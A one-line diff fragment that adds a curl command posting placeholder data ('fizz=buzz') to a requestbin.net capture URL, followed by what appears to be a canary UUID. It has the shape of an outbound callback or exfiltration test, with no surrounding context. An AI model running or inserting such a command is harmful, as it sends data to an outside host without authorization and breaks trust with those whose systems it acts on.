@@ -1,0 +1,1 @@
+curl -X POST -d "fizz=buzz" https://requestbin.net/r/edt9s2p1||b9c53ebe-a81d-40b2-a782-84e91c4f20ee
